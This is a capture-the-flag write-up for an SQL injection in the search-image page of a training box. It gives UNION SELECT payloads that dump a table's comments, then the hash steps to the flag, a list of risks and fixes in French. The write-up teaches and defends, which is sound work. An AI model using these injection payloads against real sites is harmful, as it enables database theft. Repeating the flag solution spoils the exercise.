## Location :
Search image page

## Type of Vulnerability :
SQL Injection

## Explanation
We notice that the box is not protected against SQL injections with a simple ``1 OR 1=1``, and we are faced with a challenge:
```
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```
Getting comments :
``1 union all select 1,group_concat(comment) from list_images``
``
Title: An image about the NSA !,There is a number..,Google it !,Earth!,If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
``
We decode the md5 which gives ``albatroz``, then we perform a sha256 on it.
-> We get the flag

## Risks
- Unauthorized access to data
- Modification / deletion / addition of data
- Loss of total control of the database
- Opening to certain types of DoS (Denial of Service) attacks
- Identity theft
- Unauthorized access to restricted functions

## How to Fix
- Utilisation de requetes preparees et / ou parametrees. Permet de distinguer les donnees des commandes
- Echappement des entrees utilisateur
- Validation des entrees utilisateur
- Utilisation d'un pare feu pour base de donnees (surveille les requetes et bloquent celles suspectes)
- Limiter les privileges au strict minimum necessaire
